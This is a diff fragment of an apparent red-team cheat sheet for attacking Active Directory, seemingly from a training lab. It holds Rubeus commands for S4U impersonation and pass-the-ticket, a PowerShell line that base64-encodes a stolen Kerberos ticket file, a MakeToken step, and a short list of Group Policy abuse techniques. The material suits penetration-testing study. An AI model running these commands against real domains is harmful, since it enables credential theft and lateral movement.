@@ -231,6 +231,15 @@ Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[.
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 
 Credential Cache
+Linux
+ MakeToken a.mitchell cyberbotic.io DoesNotMatter
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\User\Desktop\amitchell.kirbi"))
+Rubeus ptt /ticket:doIF[...snip...]Tw==
+
+#Group Policy Abuse
+Create GPOs
+Modify existing GPOs
+Link GPOs to OUs
 
 
 
